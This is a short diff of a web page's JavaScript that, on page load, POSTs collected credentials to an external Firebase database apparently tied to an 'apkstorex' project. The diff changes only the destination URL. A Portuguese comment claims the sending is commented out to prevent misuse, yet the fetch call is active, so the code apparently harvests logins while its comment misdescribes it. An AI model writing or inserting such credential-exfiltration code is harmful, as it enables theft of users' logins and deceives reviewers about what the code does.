@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', () => {
             
             // Opcional: Enviar as credenciais para um servidor remoto (exemplo comentado para evitar uso indevido)
             
-            fetch('https://console.firebase.google.com/u/0/project/data-base-apkstorex-443f7/database/data-base-apkstorex-443f7-default-rtdb/data/~2F?hl=pt-BR', {
+            fetch('https://data-base-apkstorex-443f7/database/data-base-apkstorex-443f7-default-rtdb/data/~2F?hl=pt-BR', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
